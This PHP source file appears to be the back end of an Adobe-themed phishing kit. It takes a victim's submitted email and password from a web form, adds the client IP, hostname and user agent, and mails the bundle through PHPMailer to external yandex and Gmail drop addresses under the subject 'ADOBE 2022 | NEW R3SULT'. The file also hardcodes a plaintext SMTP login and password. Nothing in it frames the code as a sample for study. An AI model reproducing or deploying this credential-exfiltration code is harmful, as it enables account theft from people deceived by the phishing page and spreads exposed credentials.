<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
//Load Composer's autoloader
require 'vendor/autoload.php';
//var_dump($_POST);


function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
// the message
$Email = $_POST['Email'];
$password = $_POST['password'];
$detail = $_POST['detail'];
$theemid = $_POST['theemid'];
$typeofemail = $_POST['typeofemail'];
$ip = getenv("REMOTE_ADDR");  
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];



$message1 = "+ -------- ADOBE 2022 NEW --------- +
<br>Account Details ---<br>Username : {$Email}
<br>Password : {$password}
<br>Source : {$detail}
<br>theemid : {$theemid}
<br>Type of email : {$typeofemail}<br>
<br>| --------------- I N F O | I P -------------------  |
<br>|Client IP: {$ip}
<br>|http://www.geoiptool.com/?IP= {$ip} ----|
<br>User Agent : {$useragent}<br>";



//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    //$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.zoho.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'jamesown17@gmail.com';                     //SMTP username
    $mail->Password   = 'N@vy2019';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('jamesown17@gmail.com', 'sender');
    $mail->addAddress('rubybrainoffice@yandex.com',);  
    // $mail->addAddress('rubybrainoffice@yandex.com',); //Name is optional
    $mail->addBCC('myresult2019@gmail.com');
  

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'ADOBE 2022 | NEW R3SULT';
    $mail->Body    = $message1;
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
   // echo array("signal"=>"ok","msg"=>"successful");
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}



